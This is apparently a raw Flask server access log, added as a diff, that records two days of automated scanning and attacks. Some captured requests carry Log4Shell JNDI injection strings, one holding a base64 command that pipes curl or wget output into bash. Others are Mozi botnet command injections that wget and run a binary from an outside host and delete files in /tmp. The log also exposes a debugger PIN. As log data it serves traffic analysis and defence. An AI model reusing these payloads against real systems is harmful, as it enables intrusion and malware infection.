+78.31.71.248 - - [13/Dec/2021 00:32:53] "[33mPOST /api/v1/users?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:55] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:56] "[33mPOST /api/v1/login?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:59] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:33:00] "[35m[1mPOST /login?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/usr/lib64/python3.6/json/decoder.py", line 355, in raw_decode
+    obj, end = self.scan_once(s, idx)
+StopIteration: 0
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/graph_flask/apps/view/user/routes.py", line 13, in login
+    data = json.loads(request.data)
+  File "/usr/lib64/python3.6/json/__init__.py", line 354, in loads
+    return _default_decoder.decode(s)
+  File "/usr/lib64/python3.6/json/decoder.py", line 339, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "/usr/lib64/python3.6/json/decoder.py", line 357, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+78.31.71.248 - - [13/Dec/2021 00:33:01] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:33:02] "[33mPOST /register?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:33:03] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+80.82.70.228 - - [13/Dec/2021 01:34:36] "[33mGET / HTTP/1.0[0m" 404 -
+36.34.148.241 - - [13/Dec/2021 01:37:11] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://36.34.148.241:47955/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0[0m" 404 -
+36.37.225.250 - - [13/Dec/2021 01:41:55] "[33mGET / HTTP/1.1[0m" 404 -
+195.189.248.66 - - [13/Dec/2021 01:45:27] "[33mGET / HTTP/1.1[0m" 404 -
+167.94.138.60 - - [13/Dec/2021 03:00:36] "[33mGET / HTTP/1.1[0m" 404 -
+167.94.138.60 - - [13/Dec/2021 03:00:36] "[33mGET / HTTP/1.1[0m" 404 -
+5.8.10.202 - - [13/Dec/2021 03:43:38] code 400, message Bad request version ('À\x14À')
+5.8.10.202 - - [13/Dec/2021 03:43:38] "[35m[1m î  êµaX¥<"àö~fº¶=W´BR<è»cuï ÊÙDHÝôÃÕ¸1qÅ iGä¿èæ§¥Æ(ä &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+5.8.10.202 - - [13/Dec/2021 03:43:39] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+5.8.10.202 - - [13/Dec/2021 03:43:39] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03<yýß:\x93ÞáÐª"àb\x91ê\x1cî£\x9e_ÓgâÚxî\x88s\x04Úý; xRçæÉÕ\x10\x9cÔ2\x00ó)Þów71\x16TEã÷*£\x9a\x9bÐ,ä¥\x83\x00&Ì¨Ì©À/À0À+À,À\x13À\tÀ\x14À')
+5.8.10.202 - - [13/Dec/2021 03:43:39] "[35m[1m î  ê<yýß:ÞáÐª"àbêî£_ÓgâÚxîsÚý; xRçæÉÕÔ2 ó)Þów71TEã÷*£Ð,ä¥ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+5.8.10.202 - - [13/Dec/2021 03:43:40] "[33mGET /aab9 HTTP/1.1[0m" 404 -
+183.136.226.4 - - [13/Dec/2021 04:10:15] "[33mGET / HTTP/1.1[0m" 404 -
+123.14.114.132 - - [13/Dec/2021 04:28:31] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.14.114.132:51290/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+218.29.217.234 - - [13/Dec/2021 04:45:54] "[33mGET / HTTP/1.1[0m" 404 -
+218.29.217.234 - - [13/Dec/2021 04:45:54] "[33mGET / HTTP/1.1[0m" 404 -
+218.29.217.234 - - [13/Dec/2021 04:45:54] "[33mGET / HTTP/1.1[0m" 404 -
+218.29.217.234 - - [13/Dec/2021 04:45:55] "[33mGET / HTTP/1.1[0m" 404 -
+195.54.160.149 - - [13/Dec/2021 04:48:59] "[33mGET /securityRealm/user/admin/search/index?q=a HTTP/1.1[0m" 404 -
+195.54.160.149 - - [13/Dec/2021 04:59:19] "[33mGET / HTTP/1.1[0m" 404 -
+46.174.191.31 - - [13/Dec/2021 05:27:37] "[33mGET / HTTP/1.0[0m" 404 -
+192.241.200.185 - - [13/Dec/2021 06:22:44] "[33mGET /manager/text/list HTTP/1.1[0m" 404 -
+186.33.71.199 - - [13/Dec/2021 06:25:30] "[33mGET / HTTP/1.1[0m" 404 -
+186.33.71.199 - - [13/Dec/2021 06:25:31] "[33mGET / HTTP/1.1[0m" 404 -
+186.33.71.199 - - [13/Dec/2021 06:25:34] "[33mGET / HTTP/1.1[0m" 404 -
+89.248.165.103 - - [13/Dec/2021 06:38:23] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+89.248.165.103 - - [13/Dec/2021 06:38:23] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
+74.82.47.3 - - [13/Dec/2021 08:03:53] "[33mGET / HTTP/1.1[0m" 404 -
+159.89.186.126 - - [13/Dec/2021 11:38:38] "[33mGET / HTTP/1.0[0m" 404 -
+159.89.186.126 - - [13/Dec/2021 11:41:43] "[33mGET / HTTP/1.1[0m" 404 -
+192.241.214.68 - - [13/Dec/2021 11:44:29] "[33mGET /hudson HTTP/1.1[0m" 404 -
+221.226.159.22 - - [13/Dec/2021 11:54:21] "[33mGET / HTTP/1.1[0m" 404 -
+221.226.159.22 - - [13/Dec/2021 11:54:21] "[33mGET / HTTP/1.1[0m" 404 -
+221.226.159.22 - - [13/Dec/2021 11:54:21] "[33mGET / HTTP/1.1[0m" 404 -
+221.226.159.22 - - [13/Dec/2021 11:54:21] "[33mGET / HTTP/1.1[0m" 404 -
+3.232.216.151 - - [13/Dec/2021 11:54:43] "[33mHEAD http://81.71.160.63/cc.php HTTP/1.1[0m" 404 -
+3.232.216.151 - - [13/Dec/2021 11:55:26] "[33mHEAD http://81.71.160.63/cc.php HTTP/1.1[0m" 404 -
+3.232.216.151 - - [13/Dec/2021 11:56:04] "[33mHEAD http://81.71.160.63/cc.php HTTP/1.1[0m" 404 -
+198.199.106.141 - - [13/Dec/2021 12:17:41] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+195.54.160.149 - - [13/Dec/2021 13:00:13] "[33mGET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuNDMuNy4xNzI6ODA4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xMDEuNDMuNy4xNzI6ODA4MCl8YmFzaA==} HTTP/1.1[0m" 404 -
+157.230.143.29 - - [13/Dec/2021 13:48:44] "[33mGET / HTTP/1.1[0m" 404 -
+157.230.143.29 - - [13/Dec/2021 13:48:54] code 400, message Bad request syntax ("238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|")
+157.230.143.29 - - [13/Dec/2021 13:48:54] "[35m[1m238 ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|[0m" HTTPStatus.BAD_REQUEST -
+157.230.143.29 - - [13/Dec/2021 13:49:05] code 400, message Bad request syntax ('#')
+157.230.143.29 - - [13/Dec/2021 13:49:05] "[35m[1m#[0m" HTTPStatus.BAD_REQUEST -
+192.241.212.117 - - [13/Dec/2021 14:16:39] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8a\x01\x00\x00\x86\x03\x03\x940±»¯BÔ·k\x91a=y¶ñ[£í6ïm\\ý<\x9dÉ£`¨\x12râ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+192.241.212.117 - - [13/Dec/2021 14:16:39] "[35m[1m   0±»¯BÔ·ka=y¶ñ[£í6ïm\ý<É£`¨râ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+161.35.230.3 - - [13/Dec/2021 15:23:31] code 400, message Bad request syntax ('\x00\x0e8£\x06î{ìíS8\x00\x00\x00\x00\x00')
+161.35.230.3 - - [13/Dec/2021 15:23:31] "[35m[1m 8£î{ìíS8     [0m" HTTPStatus.BAD_REQUEST -
+89.248.168.222 - - [13/Dec/2021 16:10:54] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+89.248.168.222 - - [13/Dec/2021 16:10:54] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
+69.55.55.155 - - [13/Dec/2021 17:45:36] "[33mGET / HTTP/1.0[0m" 404 -
+152.32.219.5 - - [13/Dec/2021 18:35:31] code 400, message Bad request syntax ('\x16\x03\x01\x00¯\x01\x00\x00«\x03\x03\x08:\x96ó\x89\x99$è®\x1cì\xa0ì\x83«ÅÏË \x81(#\x81ô\x02rl\x01À\x9c\x84L\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
+152.32.219.5 - - [13/Dec/2021 18:35:31] "[35m[1m ¯  «:ó$è®ì ì«ÅÏË (#ôrlÀL  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+152.32.219.5 - - [13/Dec/2021 18:35:49] "[33mGET / HTTP/1.1[0m" 404 -
+152.32.219.5 - - [13/Dec/2021 18:35:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+152.32.219.5 - - [13/Dec/2021 18:35:53] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+152.32.219.5 - - [13/Dec/2021 18:35:54] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+113.141.64.14 - - [13/Dec/2021 19:01:02] "[33mGET / HTTP/1.1[0m" 404 -
+113.141.64.14 - - [13/Dec/2021 19:01:02] "[33mGET / HTTP/1.1[0m" 404 -
+113.141.64.14 - - [13/Dec/2021 19:01:02] "[33mGET / HTTP/1.1[0m" 404 -
+113.141.64.14 - - [13/Dec/2021 19:01:02] "[33mGET / HTTP/1.1[0m" 404 -
+80.82.77.85 - - [13/Dec/2021 20:04:57] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+80.82.77.85 - - [13/Dec/2021 20:04:57] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
+157.245.103.55 - - [13/Dec/2021 20:30:27] "[33mGET / HTTP/1.1[0m" 404 -
+157.245.103.55 - - [13/Dec/2021 20:30:28] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+ * Detected change in '/root/graph_flask/ext/__init__.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+192.241.215.108 - - [13/Dec/2021 21:41:05] "[33mGET / HTTP/1.1[0m" 404 -
+105.242.150.10 - - [13/Dec/2021 22:06:58] "[33mGET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0[0m" 404 -
+46.174.191.29 - - [13/Dec/2021 22:34:55] "[33mGET / HTTP/1.0[0m" 404 -
+45.190.156.66 - - [13/Dec/2021 22:54:20] "[33mGET / HTTP/1.1[0m" 404 -
+186.33.82.108 - - [13/Dec/2021 23:10:41] "[33mGET / HTTP/1.1[0m" 404 -
+131.161.182.31 - - [13/Dec/2021 23:29:37] "[33mGET / HTTP/1.1[0m" 404 -
+45.137.23.246 - - [13/Dec/2021 23:43:28] "[33mGET / HTTP/1.1[0m" 404 -
+195.54.160.149 - - [14/Dec/2021 00:55:10] "[33mGET /securityRealm/user/admin/search/index?q=a HTTP/1.1[0m" 404 -
+195.54.160.149 - - [14/Dec/2021 01:06:05] "[33mGET / HTTP/1.1[0m" 404 -
+222.186.19.235 - - [14/Dec/2021 01:24:20] code 400, message Bad request syntax ("\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¹-LpBndJ\xadHÎ\x91dì±f\x97\x03j\x8d¥þEbb\x97AÄëW\x0f3 \x0c~\x89'K$»ì\x15\x93¦9¡×\x87~èfÜ@Ï\x0b¶\x95FLÛ_¿¸ ¨\x00&Ì¨Ì©À/À0À+À,À\x13À\tÀ\x14À")
+222.186.19.235 - - [14/Dec/2021 01:24:20] "[35m[1m î  ê¹-LpBndJ­HÎdì±fj¥þEbbAÄëW3 ~'K$»ì¦9¡×~èfÜ@Ï¶FLÛ_¿¸ ¨ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+222.186.19.235 - - [14/Dec/2021 01:24:20] "[33mGET http://fuwu.sogou.com/404/index.html HTTP/1.1[0m" 404 -
+222.186.19.235 - - [14/Dec/2021 01:24:20] "[33mGET http://fuwu.sogou.com/404/index.html HTTP/1.1[0m" 404 -
+222.186.19.235 - - [14/Dec/2021 01:24:27] code 400, message Bad request syntax ('\x05\x01\x00')
+222.186.19.235 - - [14/Dec/2021 01:24:27] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+71.6.232.4 - - [14/Dec/2021 01:46:34] "[33mGET / HTTP/1.1[0m" 404 -
+117.194.175.33 - - [14/Dec/2021 04:00:19] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.194.175.33:52816/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0[0m" 404 -
+198.98.49.124 - - [14/Dec/2021 04:21:16] "[33mGET / HTTP/1.1[0m" 404 -
+102.115.129.15 - - [14/Dec/2021 04:55:10] "[33mGET / HTTP/1.1[0m" 404 -
+145.255.3.83 - - [14/Dec/2021 05:06:33] "[33mGET / HTTP/1.1[0m" 404 -
+45.137.21.9 - - [14/Dec/2021 05:10:54] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:08:30] "[33mGET / HTTP/1.0[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:09:53] "[33mGET /text4041639436993 HTTP/1.1[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:09:53] "[33mPOST /sdk HTTP/1.1[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:09:53] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:10:03] "[33mGET /evox/about HTTP/1.1[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:10:03] "[33mGET / HTTP/1.0[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:10:03] code 400, message Bad request version ('\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+39.103.152.89 - - [14/Dec/2021 07:10:03] "[35m[1m  üDUâLôI¡|ìHõrÄ>ïó¢5  Ú      3 9 :  5 [0m" HTTPStatus.BAD_REQUEST -
+39.103.152.89 - - [14/Dec/2021 07:10:03] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03°Ú4È\x13mmVíæõ÷9<\x87»D48.Iþ\x8b\x95§Ò\x93è\x13\x99°|\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+39.103.152.89 - - [14/Dec/2021 07:10:03] "[35m[1m  ü°Ú4ÈmmVíæõ÷9<»D48.Iþ§Òè°|  Ú      3 9 :  5 [0m" HTTPStatus.BAD_REQUEST -
+39.103.152.89 - - [14/Dec/2021 07:10:03] code 400, message Bad request version ('°¤-¹s\x01\x13\x18Ê\x0e]\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+39.103.152.89 - - [14/Dec/2021 07:10:03] "[35m[1m  üÙ^qP]<W¤5°tF;Ò°¤-¹sÊ]  Ú      3 9 :  5 [0m" HTTPStatus.BAD_REQUEST -
+39.103.152.89 - - [14/Dec/2021 07:10:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03È')
+39.103.152.89 - - [14/Dec/2021 07:10:03] "[35m[1m  üÈô³¨Ãï1Ýn¾¨ä ë[0m" HTTPStatus.BAD_REQUEST -
+39.103.152.89 - - [14/Dec/2021 07:10:15] "[33mGET / HTTP/1.1[0m" 404 -
+39.103.152.89 - - [14/Dec/2021 07:10:15] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+198.98.49.124 - - [14/Dec/2021 09:16:21] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+209.141.50.223 - - [14/Dec/2021 09:28:10] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+92.118.161.29 - - [14/Dec/2021 09:52:36] "[33mGET / HTTP/1.1[0m" 404 -
+165.227.136.172 - - [14/Dec/2021 11:06:49] "[33mGET / HTTP/1.0[0m" 404 -
+188.95.186.50 - - [14/Dec/2021 11:20:39] "[33mGET / HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2021 11:52:40] code 400, message Bad request syntax ('\x00ÿ\x02\x00\x0c\x00QUERY_STRING\x00\x00\x0e\x00REQUEST_METHOD\x07\x00OPTIONS\x0c\x00CONTENT_TYPE\x00\x00\x0e\x00CONTENT_LENGTH\x00\x00\x0b\x00REQUEST_URI')
+127.0.0.1 - - [14/Dec/2021 11:52:40] "[35m[1m ÿ  QUERY_STRING   REQUEST_METHOD OPTIONS CONTENT_TYPE   CONTENT_LENGTH   REQUEST_URI[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Dec/2021 11:52:50] code 400, message Bad request syntax ('\x00ÿ\x02\x00\x0c\x00QUERY_STRING\x00\x00\x0e\x00REQUEST_METHOD\x07\x00OPTIONS\x0c\x00CONTENT_TYPE\x00\x00\x0e\x00CONTENT_LENGTH\x00\x00\x0b\x00REQUEST_URI')
+127.0.0.1 - - [14/Dec/2021 11:52:50] "[35m[1m ÿ  QUERY_STRING   REQUEST_METHOD OPTIONS CONTENT_TYPE   CONTENT_LENGTH   REQUEST_URI[0m" HTTPStatus.BAD_REQUEST -
